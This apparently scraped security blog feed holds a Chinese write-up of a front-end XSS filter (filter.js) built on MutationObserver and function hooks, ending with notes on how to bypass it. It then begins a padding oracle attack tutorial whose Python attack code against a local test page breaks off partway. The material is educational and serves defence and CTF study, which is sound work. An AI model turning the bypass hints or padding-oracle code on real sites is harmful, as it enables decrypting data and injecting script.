class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">alert(<span class="string">'123'</span>);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p><h2 id="我们从静态检测开始"><a href="#我们从静态检测开始" class="headerlink" title="我们从静态检测开始"></a>我们从静态检测开始</h2><p>在阐述具体的实现代码之前，我们必须了解静态检测的局限性，这十分重要所以我不得不先声明：</p><ul><li>如果用动态代码加载的话，就算监听到了标签执行，也无法得到加载的动态代码，就比如script的src</li><li>使用js动态生成的标签不会触发任何事件，静态检测只能监听那些一开始在html文件里有的标签</li></ul><p>静态检测的原理就是利用<code>MutationObserver</code>对象实现对标签行为的监测，设定在哪些标签行为下触发我们的自定义处理函数</p><ol><li>首先是做一些配置<br><code>var MutationObserver = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver;</code></li><li><p>然后我们实例化一个新的Mutation观察者对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> observer = <span class="keyword">new</span> MutationObserver(<span class="function"><span class="keyword">function</span>(<span class="params">mutations</span>) </span>&#123;</div><div class="line">        mutations.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">mutation</span>) </span>&#123;</div><div class="line"></div><div class="line">nodes = mutation.addedNodes;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nodes.length; i++)&#123;</div><div class="line">        <span class="keyword">var</span> node = nodes[i];</div><div class="line"></div><div class="line"><span class="comment">//这里就可以基于捕获的node来愉快的进行自定义的操作了！！</span></div><div class="line"></div><div class="line">        &#125;);</div><div class="line">    &#125;);</div></pre></td></tr></table></figure></li><li><p>为观察者对象指定配置——声明观察者在<strong>哪些标签</strong>触发<strong>什么行为</strong>下调用函数<br> 这里推荐一组练习，看过之后基本就明白了</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">observer.observe(target, &#123;<span class="attr">childList</span>:<span class="literal">true</span>&#125;)                              <span class="comment">//childList属性只观察子节点的新建与删除,子节点本身的任何变化都不会去理会  </span></div><div class="line">target.appendChild(<span class="built_in">document</span>.createElement(<span class="string">"div"</span>))                       <span class="comment">//添加了一个元素子节点,触发回调函数.</span></div><div class="line">target.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">"foo"</span>))                      <span class="comment">//添加了一个文本子节点,触发回调函数.</span></div><div class="line">target.removeChild(target.childNodes[<span class="number">0</span>])                                <span class="comment">//移除第一个子节点,触发回调函数.</span></div><div class="line">target.childNodes[<span class="number">0</span>].appendChild(<span class="built_in">document</span>.createElement(<span class="string">"div"</span>))         <span class="comment">//为第一个子节点添加一个子节点,不会触发回调函数,如果需要触发,则需要设置subtree属性为true.</span></div><div class="line"></div><div class="line">observer.observe(target, &#123;<span class="attr">childList</span>:<span class="literal">true</span>,<span class="attr">subtree</span>:<span class="literal">true</span>&#125;)                 <span class="comment">//subtree属性让观察行为进行"递归",这时,以target节点为根节点的整棵DOM树发生的变化都可能会被观察到 </span></div><div class="line">observer.observe(<span class="built_in">document</span>, &#123;<span class="attr">childList</span>:<span class="literal">true</span>,<span class="attr">subtree</span>:<span class="literal">true</span>&#125;)               <span class="comment">//如果target为document或者document.documentElement,则当前文档中所有的节点添加与删除操作都会被观察到</span></div><div class="line">observer.observe(<span class="built_in">document</span>, &#123;<span class="attr">childList</span>:<span class="literal">true</span>,<span class="attr">attributes</span>:<span class="literal">true</span>,<span class="attr">characterData</span>:<span class="literal">true</span>,<span class="attr">subtree</span>:<span class="literal">true</span>&#125;)   <span class="comment">//当前文档中几乎所有类型的节点变化都会被观察到(包括属性节点的变化和文本节点的变化等)</span></div><div class="line"></div><div class="line">observer.observe(target, &#123;<span class="attr">childList</span>:<span class="literal">true</span>&#125;)                              <span class="comment">//假设此时target的outHTML内容为&lt;div&gt;foo&lt;div&gt;,则: </span></div><div class="line">target.childNodes[<span class="number">0</span>].data = <span class="string">"bar"</span>                                       <span class="comment">//不会触发回调函数,因为childList只观察节点的新建与删除,而这里target节点的子节点仍然只有一个,没有多,没有少</span></div><div class="line">observer.observe(target, &#123;<span class="attr">childList</span>:<span class="literal">true</span>,<span class="attr">characterData</span>:<span class="literal">true</span>&#125;)           <span class="comment">//加上characterData属性,允许观察文本节点的变化,行不行? </span></div><div class="line">target.childNodes[<span class="number">0</span>].data = <span class="string">"bar"</span>                                       <span class="comment">//还是不会触发回调函数,因为发生变化的是target节点的子节点,我们目前的目标节点只有一个,就是target.</span></div><div class="line">observer.observe(target, &#123;<span class="attr">childList</span>:<span class="literal">true</span>,<span class="attr">characterData</span>:<span class="literal">true</span>,<span class="attr">subtree</span>:<span class="literal">true</span>&#125;)  <span class="comment">//加上subtree属性,观察所有后代节点 </span></div><div class="line">target.childNodes[<span class="number">0</span>].data = <span class="string">"bar"</span>                                       <span class="comment">//触发了回调函数,发生变化的是target节点的文本子节点(必须同时有characterData和subtree属性,才能观察到一个元素目标节点里的文本内容的变化)</span></div><div class="line"></div><div class="line">observer.observe(target, &#123;<span class="attr">attributes</span>:<span class="literal">true</span>&#125;)                             <span class="comment">//只观察目标节点的属性节点</span></div><div class="line">target.setAttribute(<span class="string">"foo"</span>,<span class="string">"bar"</span>)                                        <span class="comment">//不管foo属性存在不存在,都会触发回调函数</span></div><div class="line">target.setAttribute(<span class="string">"foo"</span>,<span class="string">"bar"</span>)                                        <span class="comment">//即使前后两次的属性值一样,还是会触发回调函数</span></div><div class="line">target.removeAttribute(<span class="string">"foo"</span>)                                           <span class="comment">//移除foo属性节点,触发回调函数</span></div><div class="line">target.removeAttribute(<span class="string">"foo"</span>)                                           <span class="comment">//不会触发回调函数,因为已经没有属性节点可移除了</span></div><div class="line">observer.observe(target, &#123;<span class="attr">attributes</span>:<span class="literal">true</span>,<span class="attr">attributeFilter</span>:[<span class="string">"bar"</span>]&#125;)     <span class="comment">//指定要观察的属性名</span></div><div class="line">target.setAttribute(<span class="string">"foo"</span>,<span class="string">"bar"</span>)                                        <span class="comment">//不会触发回调函数,因为attributeFilter数组不包含"foo"</span></div><div class="line">target.setAttribute(<span class="string">"bar"</span>,<span class="string">"foo"</span>)</div></pre></td></tr></table></figure></li></ol><p><strong>嗯，然后我们就可以实现对所有标签的触发事件监听了，下面是filter.js中的代码</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">interceptionStaticScript</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">var</span> MutationObserver = <span class="built_in">window</span>.MutationObserver || <span class="built_in">window</span>.WebKitMutationObserver || <span class="built_in">window</span>.MozMutationObserver;</div><div class="line"></div><div class="line">    <span class="comment">//实例化一个新的Mutation观察者对象</span></div><div class="line">    <span class="keyword">var</span> observer = <span class="keyword">new</span> MutationObserver(<span class="function"><span class="keyword">function</span>(<span class="params">mutations</span>) </span>&#123;</div><div class="line">        mutations.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">mutation</span>) </span>&#123;</div><div class="line">            begininterceptionstatic(mutation)</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div><div class="line"></div><div class="line">    <span class="comment">//为观察者对象传入要观察的对象，并设置config</span></div><div class="line">    <span class="comment">//这里的对象为document，配置为subtree+childList，也就表示会在所有的节点的子节点新建或时触发事件</span></div><div class="line">    observer.observe(<span class="built_in">document</span>, &#123;</div><div class="line">        <span class="attr">subtree</span>: <span class="literal">true</span>,</div><div class="line">        <span class="attr">childList</span>: <span class="literal">true</span></div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//事件触发时的响应函数</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">begininterceptionstatic</span>(<span class="params">mutation</span>)</span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> nodes = mutation.addedNodes;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nodes.length; i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">var</span> node = nodes[i];</div><div class="line"></div><div class="line">        <span class="comment">//挑选出来script标签与iframe标签</span></div><div class="line">        <span class="keyword">if</span> (node.tagName === <span class="string">'SCRIPT'</span> || node.tagName === <span class="string">'IFRAME'</span>)</div><div class="line">        &#123;</div><div class="line">        <span class="comment">//如果iframe标签有srcdoc的话就在dom里删除此标签</span></div><div class="line">            <span class="keyword">if</span> (node.tagName === <span class="string">'IFRAME'</span> &amp;&amp; node.srcdoc)</div><div class="line">            &#123;</div><div class="line">                node.parentNode.removeChild(node);</div><div class="line">                <span class="built_in">console</span>.log(<span class="string">'f4ck you! don\'t use iframe'</span>, node.srcdoc);</div><div class="line"></div><div class="line">            &#125;</div><div class="line">            <span class="comment">//检测script以及iframe标签的匹配方式，只有通过白名单的才行</span></div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (node.src)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">if</span> (!whileListMatch(whiteList, node.src))</div><div class="line">                &#123;</div><div class="line">                    node.parentNode.removeChild(node);</div><div class="line">                    <span class="built_in">console</span>.log(<span class="string">'f4ck you!'</span>, node.src);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="comment">//对iframe以及script标签的内容也就是innerHTML进行黑名单检测</span></div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (blackregmatch(jswordblacklist,node.textContent))</div><div class="line">            &#123;</div><div class="line">                node.parentNode.removeChild(node);</div><div class="line">                <span class="built_in">console</span>.log(<span class="string">'f4ck you! '</span>+node.textContent);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="开始我们的动态检测部分"><a href="#开始我们的动态检测部分" class="headerlink" title="开始我们的动态检测部分"></a>开始我们的动态检测部分</h2><p>动态检测相比于静态检测更加准确，毕竟这是从原生代码层面上进行的重写，所有的行为最终还是要调用这些系统原生代码的，就算是静态检测无法防御的动态标签生成也可以被检测到<br>动态检测采用了Hook的原理，通过对一些敏感函数进行Hook后，在其运行期间加上一些代码以起到防御的作用。</p><p>首先我们来尝试所有标签src属性的Hook<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//保存原始的setter变量</span></div><div class="line"><span class="keyword">var</span> raw_setter = HTMLScriptElement.prototype.__lookupSetter__(<span class="string">'src'</span>);</div><div class="line"></div><div class="line"><span class="comment">//重写Setter访问器，这个访问器是会在src属性添加时调用的系统代码</span></div><div class="line">HTMLScriptElement.prototype.__defineSetter__(<span class="string">'src'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//自定义对src的操作</span></div><div class="line">    <span class="keyword">if</span> (!whileListMatch(whiteList,url))</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'f4ck you! '</span>+url);</div><div class="line">        <span class="keyword">return</span> ;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//处理结束的时候通过刚才被保存的原始setter变量继续执行系统代码</span></div><div class="line">    raw_setter.call(<span class="keyword">this</span>, url);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><p>类似的，Hook所有的innerHTML生成：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//同样先保存原始的setter变量</span></div><div class="line"><span class="keyword">var</span> raw_setter = HTMLScriptElement.prototype.__lookupSetter__(<span class="string">'innerHTML'</span>);</div><div class="line"></div><div class="line"><span class="comment">//然后重写setter访问器</span></div><div class="line">HTMLScriptElement.prototype.__defineSetter__(<span class="string">'innerHTML'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</div><div class="line"></div><div class="line"><span class="comment">//然后添加任意处理代码</span></div><div class="line">    <span class="keyword">if</span> (blackregmatch(wordblacklistinnerHTML, url))</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'f4ck you! '</span>+url);</div><div class="line">        <span class="keyword">return</span> ;</div><div class="line">    &#125;</div><div class="line"><span class="comment">//处理结束的时候通过刚才被保存的原始setter变量继续执行系统代码</span></div><div class="line">    raw_setter.call(<span class="keyword">this</span>, url);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><p>尝试Hook一个系统函数document.write()，对其参数进行操作处理<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//首先获得这个函数的对象</span></div><div class="line"><span class="keyword">var</span> old_write = <span class="built_in">window</span>.document.write;</div><div class="line"><span class="comment">//然后重写此函数</span></div><div class="line"><span class="built_in">window</span>.document.write = <span class="function"><span class="keyword">function</span>(<span class="params">string</span>)</span></div><div class="line">&#123;</div><div class="line"><span class="comment">//基于函数的参数进行自定义的操作</span></div><div class="line">    <span class="keyword">if</span> (blackregmatch(wordblacklistDocumetnWrite, string))</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'f4ck you! '</span>, string);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">//接着运行函数原生代码：使用函数对象.apply(document, arguments)这种写法</span></div><div class="line">    old_write.apply(<span class="built_in">document</span>, <span class="built_in">arguments</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>同理，我们Hook敏感的ajax函数<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//存储xhr对象open函数以便之后继续运行</span></div><div class="line"><span class="keyword">var</span> s_ajaxListener = <span class="keyword">new</span> <span class="built_in">Object</span>();</div><div class="line">s_ajaxListener.tempOpen = <span class="keyword">this</span>.XMLHttpRequest.prototype.open;</div><div class="line">s_ajaxListener.tempSend = <span class="keyword">this</span>.XMLHttpRequest.prototype.send;</div><div class="line"></div><div class="line"><span class="comment">//开始重写xhr的open函数</span></div><div class="line"><span class="keyword">this</span>.XMLHttpRequest.prototype.open = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span></div><div class="line">&#123;</div><div class="line"><span class="comment">//在执行xhr的open函数前插入自定义的操作</span></div><div class="line">    <span class="keyword">if</span> (!a) <span class="keyword">var</span> a=<span class="string">' '</span>;</div><div class="line">    <span class="keyword">if</span> (!b) <span class="keyword">var</span> b=<span class="string">' '</span>;</div><div class="line">    <span class="keyword">var</span> open_method=a;</div><div class="line">    <span class="comment">//拿到xhr的url，并对其做白名单检测</span></div><div class="line">    <span class="keyword">var</span> open_url=b;</div><div class="line">    <span class="keyword">if</span> (!whileListMatch(whiteList,open_url))</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'f4ck you! url:'</span>+open_method+<span class="string">':'</span>+open_url);</div><div class="line">        <span class="keyword">return</span> ;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="comment">//接着运行函数原生代码</span></div><div class="line">    s_ajaxListener.tempOpen.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>我们这些对象都是在当前的window窗口下操作，并不能Hook到iframe标签内的各种行为，所以我们还需要将所有的iframe标签的窗口都进行Hook，这里代码是使用静态检测完成的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> MutationObserver = <span class="built_in">window</span>.MutationObserver || <span class="built_in">window</span>.WebKitMutationObserver || <span class="built_in">window</span>.MozMutationObserver;</div><div class="line"></div><div class="line"><span class="keyword">var</span> observer = <span class="keyword">new</span> MutationObserver(<span class="function"><span class="keyword">function</span>(<span class="params">mutations</span>)</span></div><div class="line">&#123;</div><div class="line">    mutations.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">mutation</span>)</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">var</span> nodes = mutation.addedNodes;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nodes.length; i++)</div><div class="line">        &#123;</div><div class="line">        <span class="comment">//将installHook的操作对所有iframe中的标签也进行Hook，但是这里还是存在静态检测的固有问题的</span></div><div class="line">            <span class="keyword">var</span> node = nodes[i];</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (node.tagName == <span class="string">'IFRAME'</span>)</div><div class="line">            &#123;</div><div class="line">                installHook(node.contentWindow);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p><h2 id="过滤代码的一些问题"><a href="#过滤代码的一些问题" class="headerlink" title="过滤代码的一些问题"></a>过滤代码的一些问题</h2><p>实际上这种过滤方式如果配置严格可以起到很强的过滤性，但据Ben师傅说他出题时不小心将filter.js用成了修改之前的，所以过滤效果微乎其微，通读下来，是有这些原因的</p><ul><li>首先过滤方式分为黑名单过滤与白名单过滤，黑名单那个倒是没多少问题，但是白名单的正则式里面有这一条<code>.*?</code>，这是会匹配到所有字符串的，所以白名单根本就没有起到过滤效果。。。</li><li>另外一点是，js毕竟是种写法多样的语言，一种写法被过滤了，总有相应的其他写法来代替，而本filter.js文件中其实并没有对多少关键写法进行限制，像<code>&lt;iframe src=&quot;javascript：&quot;&gt;</code>,<code>xhr</code>,等等都没有限制严格，所以实际上很多写法都是可行的</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最早的时候是从今年的Bctf的xss题目中遇到的filter.js这种过滤形式，但当时对xss题目一直全程懵逼所以也没有留下代码来好好分析过这种过滤，这次Ben师傅出的xss题目恰好使用了这种防御机制，于是打算好好整理一下。（PS：一看到题目的背景图片就知道这题一定是Ben师傅出的，赛后一问果然是2333）&lt;br&gt;这种前端的XSS防御主要由两部分构成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;静态检测&lt;/li&gt;
&lt;li&gt;动态检测&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Padding Oracle Attack</title>
    <link href="https://someonesometimes.github.io/2017/09/04/Padding-Oracle-Attack/"/>
    <id>https://someonesometimes.github.io/2017/09/04/Padding-Oracle-Attack/</id>
    <published>2017-09-04T12:29:19.000Z</published>
    <updated>2017-11-19T05:53:38.989Z</updated>
    
    <content type="html"><![CDATA[<p>代码是完成了，但还是有个小疑问（会在最后给出描述），问了好多师傅但都没回我，好尴尬-_-||<br>更新:在Ben师傅的帮助下问题已经解决，解决方案和问题描述放在最后，代码也已经更新请放心食用~~</p><a id="more"></a><h2 id="首先描述应用场景"><a href="#首先描述应用场景" class="headerlink" title="首先描述应用场景"></a>首先描述应用场景</h2><p>有许多网站存在这样的功能：参数是经过对称加密算法加密过的，一般用aes的居多，然后传到服务端后先对参数进行解码，之后再去利用。这样有什么好处呢？基本就像是封死了这个参数点一样，因为我们没有密钥，所以也无法构造出有效的参数来（大多数都会在解密时发现错误而丢弃），而Padding Oracle Attack可以适用于这样一种情况：<br><strong>在服务端使用的分组加密模式为CBC+PKCS填充方案，并且在传入无法解密的cipherText值与传入可以解密的CipherText值具有两种不同的回显时，我们就可以通过这种攻击方式来计算得到密文对应的明文，同时也可以计算出明文所对应的密文</strong></p><h2 id="然后是重头戏，对Padding-Oracle-Attack的理解"><a href="#然后是重头戏，对Padding-Oracle-Attack的理解" class="headerlink" title="然后是重头戏，对Padding Oracle Attack的理解"></a>然后是重头戏，对Padding Oracle Attack的理解</h2><p>直接放上赵颉老师翻译的一篇博文<a href="http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html" title="http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html" target="_blank" rel="external">http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html</a>，貌似大家都是从这篇文章接触的这种攻击方式</p><p>具体的攻击方式就不再详细阐述，看赵老师的博客就好，然后这里说一些要注意的点：</p><ul><li>赵老师的博文里面的讲解用的是DES，所以每个分块都是8个字节，而现在常见的都是aes也就是一块是16个字节的，自己改一下就好，下面给出的实现代码是AES的</li><li>其实这种攻击最根本上就是在求密文所对应的middle中间值，所用的函数像由密文求明文，由明文求密文实际上都是分块先把中间值求出来</li><li>Padding Oracle Attack是分块运行的，所以可以开多线程来求每个分组的中间值</li><li>其实我们是在遍历IV值来求middle中间值，所以只要IV值是可控的就可以，只有IV值可控而密文不可控下，是可以对一个分组进行加解密的</li></ul><h2 id="实现代码，尽可能的注释详细些"><a href="#实现代码，尽可能的注释详细些" class="headerlink" title="实现代码，尽可能的注释详细些"></a>实现代码，尽可能的注释详细些</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line">N = <span class="number">16</span>      <span class="comment">#只有部分更改了过来，有些细节上还无意识的使用者32或16</span></div><div class="line">legth = N*<span class="number">2</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_format</span><span class="params">(num,legth)</span>:</span></div><div class="line">    str = hex(num)[<span class="number">2</span>:]</div><div class="line">    <span class="keyword">if</span> str[len(str)<span class="number">-1</span>] == <span class="string">'L'</span>:</div><div class="line">        str = str[:<span class="number">-1</span>]</div><div class="line">    <span class="keyword">return</span> <span class="string">'0'</span>*(legth-len(str))+str</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#这个是由使用者根据情况自定义的对回显界面的判断</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject</span><span class="params">(s, iv, cipher)</span>:</span></div><div class="line"></div><div class="line">    <span class="comment"># print iv+cipher</span></div><div class="line">    url = <span class="string">'http://localhost/test1.php?id=&#123;&#125;'</span>.format(iv+cipher)</div><div class="line">    <span class="comment"># print url</span></div><div class="line">    retu = s.get(url)</div><div class="line">    <span class="comment"># print retu.content</span></div><div class="line">    <span class="keyword">if</span> retu.content == <span class="string">'hacker?'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    <span class="keyword">if</span> retu.content == <span class="string">'1'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="comment">#输入cipher的str形式，可以得到mid值的str形式</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_aes_mid</span><span class="params">(cipher)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_list_to_str_</span><span class="params">(iv)</span>:</span></div><div class="line">        retu = <span class="string">""</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> iv:</div><div class="line">            retu += hex_format(i,<span class="number">2</span>)</div><div class="line">        <span class="keyword">return</span> retu</div><div class="line"></div><div class="line">    <span class="comment">#避免重复建立requests对象</span></div><div class="line">    s = requests.session()</div><div class="line"></div><div class="line">    <span class="comment">#主要就是对iv进行遍历，为了方便操作采用这种list的形式，元素为int型   同时建立输出参数mid_str</span></div><div class="line">    iv 